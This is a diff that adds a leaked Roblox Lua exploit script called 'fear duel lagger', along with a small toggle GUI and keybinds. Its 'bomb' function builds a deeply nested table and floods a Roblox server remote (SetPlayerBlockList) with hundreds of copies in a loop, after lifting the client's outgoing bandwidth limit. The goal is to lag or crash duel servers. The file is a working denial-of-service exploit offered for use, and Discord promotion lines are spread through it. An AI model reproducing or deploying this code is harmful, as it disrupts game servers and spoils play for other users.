@@ -1,0 +1,483 @@
+-- leaked by https://discord.gg/PEp8BuS6mV
+
+local FearDuelLaggerGUI = Instance.new("ScreenGui")
+FearDuelLaggerGUI.Name = "FearDuelLaggerGUI"
+FearDuelLaggerGUI.IgnoreGuiInset = true
+FearDuelLaggerGUI.ResetOnSpawn = false
+FearDuelLaggerGUI.DisplayOrder = 120
+FearDuelLaggerGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+FearDuelLaggerGUI.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+
+-- leaked by https://discord.gg/PEp8BuS6mV - Services
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+local LP = Players.LocalPlayer
+
+-- leaked by https://discord.gg/PEp8BuS6mV - Lagger Config
+local LAGGER_CONFIG = {
+    TableIncrease = 250,
+    Tries = 1,
+    LoopWaitTime = 0.3
+}
+
+-- leaked by https://discord.gg/PEp8BuS6mV - Lagger Functions
+local function getmaxvalue(val)
+    local mainvalueifonetable = 499999
+    if type(val) ~= "number" then return nil end
+    return mainvalueifonetable / (val + 2)
+end
+
+local function bomb(tableincrease, tries)
+    local maintable = {}
+    local spammedtable = {}
+    table.insert(spammedtable, {})
+    local z = spammedtable[1]
+    for i = 1, tableincrease do
+        local tableins = {}
+        table.insert(z, tableins)
+        z = tableins
+    end
+    local maximum = getmaxvalue(tableincrease) or 9999999
+    for i = 1, maximum do
+        table.insert(maintable, spammedtable)
+    end
+    for i = 1, tries do
+        pcall(function()
+            game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+        end)
+    end
+end
+
+local laggerEnabled = false
+local laggerThread = nil
+
+local function startLaggerLoop()
+    while laggerEnabled do
+        pcall(function()
+            game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+        end)
+        bomb(LAGGER_CONFIG.TableIncrease, LAGGER_CONFIG.Tries)
+        task.wait(LAGGER_CONFIG.LoopWaitTime)
+    end
+end
+
+local function stopLaggerLoop()
+    laggerEnabled = false
+    if laggerThread then
+        coroutine.close(laggerThread)
+        laggerThread = nil
+    end
+end
+
+local function startLagger()
+    if laggerThread then return end
+    laggerEnabled = true
+    laggerThread = coroutine.create(startLaggerLoop)
+    coroutine.resume(laggerThread)
+end
+
+-- leaked by https://discord.gg/PEp8BuS6mV - Config
+local config = {
+    laggerOn = false,
+    kbKey = "J",
+    padKey = "ButtonL3",
+    isEditingKB = false,
+    isEditingPad = false
+}
+
+-- leaked by https://discord.gg/PEp8BuS6mV - GUI
+local Main = Instance.new("Frame")
+Main.Name = "Main"
+Main.Active = true
+Main.Position = UDim2.new(0,10,0,10)
+Main.Size = UDim2.new(0,210,0,170)
+Main.BackgroundColor3 = Color3.fromRGB(18,18,20)
+Main.BorderSizePixel = 0
+Main.Parent = FearDuelLaggerGUI
+
+local UICorner = Instance.new("UICorner")
+UICorner.Name = "UICorner"
+UICorner.CornerRadius = UDim.new(0,12)
+UICorner.Parent = Main
+
+local UIStroke = Instance.new("UIStroke")
+UIStroke.Name = "UIStroke"
+UIStroke.Color = Color3.fromRGB(50,50,60)
+UIStroke.Parent = Main
+
+local Frame = Instance.new("Frame")
+Frame.Name = "Frame"
+Frame.ZIndex = 2
+Frame.Size = UDim2.new(1,0,0,28)
+Frame.BackgroundColor3 = Color3.fromRGB(14,14,16)
+Frame.BorderSizePixel = 0
+Frame.Parent = Main
+
+local UICorner2 = Instance.new("UICorner")
+UICorner2.Name = "UICorner"
+UICorner2.CornerRadius = UDim.new(0,12)
+UICorner2.Parent = Frame
+
+local Frame2 = Instance.new("Frame")
+Frame2.Name = "Frame"
+Frame2.ZIndex = 2
+Frame2.Position = UDim2.new(0,0,1,-12)
+Frame2.Size = UDim2.new(1,0,0,12)
+Frame2.BackgroundColor3 = Color3.fromRGB(14,14,16)
+Frame2.BorderSizePixel = 0
+Frame2.Parent = Frame
+
+local TextLabel = Instance.new("TextLabel")
+TextLabel.Name = "TextLabel"
+TextLabel.ZIndex = 3
+TextLabel.Position = UDim2.new(0,10,0,0)
+TextLabel.Size = UDim2.new(1,-30,1,0)
+TextLabel.BackgroundTransparency = 1
+TextLabel.Text = "fear duel lagger"
+TextLabel.TextColor3 = Color3.fromRGB(255,255,255)
+TextLabel.TextSize = 11
+TextLabel.Font = Enum.Font.GothamBold
+TextLabel.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel.Parent = Frame
+
+-- Close Button
+local TextButton = Instance.new("TextButton")
+TextButton.Name = "TextButton"
+TextButton.ZIndex = 4
+TextButton.Position = UDim2.new(1,-24,0,4)
+TextButton.Size = UDim2.new(0,20,0,20)
+TextButton.BackgroundTransparency = 1
+TextButton.BorderSizePixel = 0
+TextButton.Text = "✕"
+TextButton.TextColor3 = Color3.fromRGB(200,200,200)
+TextButton.TextSize = 13
+TextButton.Font = Enum.Font.GothamBold
+TextButton.Parent = Frame
+
+TextButton.MouseButton1Click:Connect(function()
+    stopLaggerLoop()
+    FearDuelLaggerGUI:Destroy()
+end)
+
+-- Dragging
+local dragging = false
+local dragStart = nil
+local startPos = nil
+
+Frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = Main.Position
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = false
+    end
+end)
+
+local Frame3 = Instance.new("Frame")
+Frame3.Name = "Frame"
+Frame3.ZIndex = 2
+Frame3.Position = UDim2.new(0,8,0,30)
+Frame3.Size = UDim2.new(1,-16,0,1)
+Frame3.BackgroundColor3 = Color3.fromRGB(50,50,60)
+Frame3.BorderSizePixel = 0
+Frame3.Parent = Main
+
+local Frame4 = Instance.new("Frame")
+Frame4.Name = "Frame"
+Frame4.ZIndex = 2
+Frame4.Position = UDim2.new(0,8,0,36)
+Frame4.Size = UDim2.new(1,-16,0,130)
+Frame4.BackgroundTransparency = 1
+Frame4.BorderSizePixel = 0
+Frame4.Parent = Main
+
+local UIListLayout = Instance.new("UIListLayout")
+UIListLayout.Name = "UIListLayout"
+UIListLayout.Padding = UDim.new(0,6)
+UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+UIListLayout.Parent = Frame4
+
+local TextLabel2 = Instance.new("TextLabel")
+TextLabel2.Name = "TextLabel"
+TextLabel2.LayoutOrder = 1
+TextLabel2.Size = UDim2.new(1,0,0,14)
+TextLabel2.BackgroundTransparency = 1
+TextLabel2.Text = "FEAR DUELS LAG"
+TextLabel2.TextColor3 = Color3.fromRGB(110,110,120)
+TextLabel2.Font = Enum.Font.GothamBold
+TextLabel2.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel2.Parent = Frame4
+
+-- Activate Toggle Row
+local Frame5 = Instance.new("Frame")
+Frame5.Name = "Frame"
+Frame5.LayoutOrder = 2
+Frame5.Size = UDim2.new(1,0,0,30)
+Frame5.BackgroundColor3 = Color3.fromRGB(24,24,28)
+Frame5.BorderSizePixel = 0
+Frame5.Parent = Frame4
+
+local UICorner3 = Instance.new("UICorner")
+UICorner3.Name = "UICorner"
+UICorner3.CornerRadius = UDim.new(0,7)
+UICorner3.Parent = Frame5
+
+local UIStroke2 = Instance.new("UIStroke")
+UIStroke2.Name = "UIStroke"
+UIStroke2.Color = Color3.fromRGB(50,50,60)
+UIStroke2.Parent = Frame5
+
+local TextLabel3 = Instance.new("TextLabel")
+TextLabel3.Name = "TextLabel"
+TextLabel3.Position = UDim2.new(0,10,0,0)
+TextLabel3.Size = UDim2.new(1,-56,1,0)
+TextLabel3.BackgroundTransparency = 1
+TextLabel3.Text = "Activate"
+TextLabel3.TextColor3 = Color3.fromRGB(255,255,255)
+TextLabel3.TextSize = 11
+TextLabel3.Font = Enum.Font.GothamMedium
+TextLabel3.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel3.Parent = Frame5
+
+local Frame6 = Instance.new("Frame")
+Frame6.Name = "Frame"
+Frame6.Position = UDim2.new(1,-42,0.5,-9)
+Frame6.Size = UDim2.new(0,34,0,18)
+Frame6.BackgroundColor3 = Color3.fromRGB(55,55,65)
+Frame6.BorderSizePixel = 0
+Frame6.Parent = Frame5
+
+local UICorner4 = Instance.new("UICorner")
+UICorner4.Name = "UICorner"
+UICorner4.CornerRadius = UDim.new(1,0)
+UICorner4.Parent = Frame6
+
+local Frame7 = Instance.new("Frame")
+Frame7.Name = "Frame"
+Frame7.Position = UDim2.new(0,2,0.5,-6)
+Frame7.Size = UDim2.new(0,13,0,13)
+Frame7.BackgroundColor3 = Color3.fromRGB(255,255,255)
+Frame7.BorderSizePixel = 0
+Frame7.Parent = Frame6
+
+local UICorner5 = Instance.new("UICorner")
+UICorner5.Name = "UICorner"
+UICorner5.CornerRadius = UDim.new(1,0)
+UICorner5.Parent = Frame7
+
+local TextButton2 = Instance.new("TextButton")
+TextButton2.Name = "TextButton"
+TextButton2.Size = UDim2.new(1,0,1,0)
+TextButton2.BackgroundTransparency = 1
+TextButton2.Text = ""
+TextButton2.Parent = Frame6
+
+-- Toggle Function
+local function setToggleVisual(on)
+    TweenService:Create(Frame6, TweenInfo.new(0.2), {
+        BackgroundColor3 = on and Color3.fromRGB(0, 200, 100) or Color3.fromRGB(55, 55, 65)
+    }):Play()
+    TweenService:Create(Frame7, TweenInfo.new(0.2, Enum.EasingStyle.Back), {
+        Position = on and UDim2.new(1, -15, 0.5, -6) or UDim2.new(0, 2, 0.5, -6),
+        BackgroundColor3 = on and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(255, 255, 255)
+    }):Play()
+    config.laggerOn = on
+end
+
+TextButton2.MouseButton1Click:Connect(function()
+    config.laggerOn = not config.laggerOn
+    setToggleVisual(config.laggerOn)
+    if config.laggerOn then
+        startLagger()
+    else
+        stopLaggerLoop()
+    end
+end)
+
+-- Keybinds Row
+local Frame8 = Instance.new("Frame")
+Frame8.Name = "Frame"
+Frame8.LayoutOrder = 3
+Frame8.Size = UDim2.new(1,0,0,38)
+Frame8.BackgroundColor3 = Color3.fromRGB(24,24,28)
+Frame8.BorderSizePixel = 0
+Frame8.Parent = Frame4
+
+local UICorner6 = Instance.new("UICorner")
+UICorner6.Name = "UICorner"
+UICorner6.CornerRadius = UDim.new(0,7)
+UICorner6.Parent = Frame8
+
+local UIStroke3 = Instance.new("UIStroke")
+UIStroke3.Name = "UIStroke"
+UIStroke3.Color = Color3.fromRGB(50,50,60)
+UIStroke3.Parent = Frame8
+
+local TextLabel4 = Instance.new("TextLabel")
+TextLabel4.Name = "TextLabel"
+TextLabel4.Position = UDim2.new(0,8,0,0)
+TextLabel4.Size = UDim2.new(0,70,1,0)
+TextLabel4.BackgroundTransparency = 1
+TextLabel4.Text = "Duel Lagger"
+TextLabel4.TextColor3 = Color3.fromRGB(200,200,200)
+TextLabel4.TextSize = 10
+TextLabel4.Font = Enum.Font.GothamBold
+TextLabel4.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel4.Parent = Frame8
+
+local TextLabel5 = Instance.new("TextLabel")
+TextLabel5.Name = "TextLabel"
+TextLabel5.Position = UDim2.new(0,78,0,0)
+TextLabel5.Size = UDim2.new(0,90,1,0)
+TextLabel5.BackgroundTransparency = 1
+TextLabel5.Text = config.kbKey .. "  /  " .. config.padKey
+TextLabel5.TextColor3 = Color3.fromRGB(110,110,120)
+TextLabel5.TextSize = 9
+TextLabel5.Font = Enum.Font.Gotham
+TextLabel5.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel5.Parent = Frame8
+
+-- KB Button
+local TextButton3 = Instance.new("TextButton")
+TextButton3.Name = "TextButton"
+TextButton3.ZIndex = 3
+TextButton3.Position = UDim2.new(1,-62,0.5,-11)
+TextButton3.Size = UDim2.new(0,28,0,22)
+TextButton3.BackgroundColor3 = Color3.fromRGB(28,28,35)
+TextButton3.BorderSizePixel = 0
+TextButton3.Text = "KB"
+TextButton3.TextColor3 = Color3.fromRGB(200,200,200)
+TextButton3.TextSize = 9
+TextButton3.Font = Enum.Font.GothamBold
+TextButton3.Parent = Frame8
+
+local UICorner7 = Instance.new("UICorner")
+UICorner7.Name = "UICorner"
+UICorner7.CornerRadius = UDim.new(0,5)
+UICorner7.Parent = TextButton3
+
+local UIStroke4 = Instance.new("UIStroke")
+UIStroke4.Name = "UIStroke"
+UIStroke4.Color = Color3.fromRGB(45,45,55)
+UIStroke4.Parent = TextButton3
+
+-- PAD Button
+local TextButton4 = Instance.new("TextButton")
+TextButton4.Name = "TextButton"
+TextButton4.ZIndex = 3
+TextButton4.Position = UDim2.new(1,-30,0.5,-11)
+TextButton4.Size = UDim2.new(0,28,0,22)
+TextButton4.BackgroundColor3 = Color3.fromRGB(28,28,35)
+TextButton4.BorderSizePixel = 0
+TextButton4.Text = "PAD"
+TextButton4.TextColor3 = Color3.fromRGB(200,200,200)
+TextButton4.Font = Enum.Font.GothamBold
+TextButton4.Parent = Frame8
+
+local UICorner8 = Instance.new("UICorner")
+UICorner8.Name = "UICorner"
+UICorner8.CornerRadius = UDim.new(0,5)
+UICorner8.Parent = TextButton4
+
+local UIStroke5 = Instance.new("UIStroke")
+UIStroke5.Name = "UIStroke"
+UIStroke5.Color = Color3.fromRGB(45,45,55)
+UIStroke5.Parent = TextButton4
+
+-- Footer
+local Frame9 = Instance.new("Frame")
+Frame9.Name = "Frame"
+Frame9.LayoutOrder = 4
+Frame9.Size = UDim2.new(1,0,0,16)
+Frame9.BackgroundTransparency = 1
+Frame9.BorderSizePixel = 0
+Frame9.Parent = Frame4
+
+local TextLabel6 = Instance.new("TextLabel")
+TextLabel6.Name = "TextLabel"
+TextLabel6.Size = UDim2.new(1,0,1,0)
+TextLabel6.BackgroundTransparency = 1
+TextLabel6.Text = "fearduels.cc · duel lagger · leaked by https://discord.gg/PEp8BuS6mV"
+TextLabel6.TextColor3 = Color3.fromRGB(50,50,60)
+TextLabel6.Font = Enum.Font.Gotham
+TextLabel6.Parent = Frame9
+
+-- leaked by https://discord.gg/PEp8BuS6mV - Keybind Editing
+TextButton3.MouseButton1Click:Connect(function()
+    config.isEditingKB = true
+    TextButton3.Text = "..."
+    TextButton3.TextColor3 = Color3.fromRGB(255, 200, 50)
+    
+    local connection
+    connection = UserInputService.InputBegan:Connect(function(input, gpe)
+        if gpe then return end
+        if config.isEditingKB and input.UserInputType == Enum.UserInputType.Keyboard then
+            config.kbKey = input.KeyCode.Name
+            TextButton3.Text = "KB"
+            TextButton3.TextColor3 = Color3.fromRGB(200, 200, 200)
+            TextLabel5.Text = config.kbKey .. "  /  " .. config.padKey
+            config.isEditingKB = false
+            connection:Disconnect()
+        end
+    end)
+end)
+
+TextButton4.MouseButton1Click:Connect(function()
+    config.isEditingPad = true
+    TextButton4.Text = "..."
+    TextButton4.TextColor3 = Color3.fromRGB(255, 200, 50)
+    
+    local connection
+    connection = UserInputService.InputBegan:Connect(function(input, gpe)
+        if gpe then return end
+        if config.isEditingPad and input.UserInputType == Enum.UserInputType.Gamepad1 then
+            config.padKey = input.KeyCode.Name
+            TextButton4.Text = "PAD"
+            TextButton4.TextColor3 = Color3.fromRGB(200, 200, 200)
+            TextLabel5.Text = config.kbKey .. "  /  " .. config.padKey
+            config.isEditingPad = false
+            connection:Disconnect()
+        end
+    end)
+end)
+
+-- Keybind Handler
+UserInputService.InputBegan:Connect(function(input, gpe)
+    if gpe then return end
+    if config.isEditingKB or config.isEditingPad then return end
+    
+    if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode.Name == config.kbKey then
+        config.laggerOn = not config.laggerOn
+        setToggleVisual(config.laggerOn)
+        if config.laggerOn then
+            startLagger()
+        else
+            stopLaggerLoop()
+        end
+    elseif input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode.Name == config.padKey then
+        config.laggerOn = not config.laggerOn
+        setToggleVisual(config.laggerOn)
+        if config.laggerOn then
+            startLagger()
+        else
+            stopLaggerLoop()
+        end
+    end
+end)
+
+print("leaked by https://discord.gg/PEp8BuS6mV - Fear Duel Lagger Loaded!")
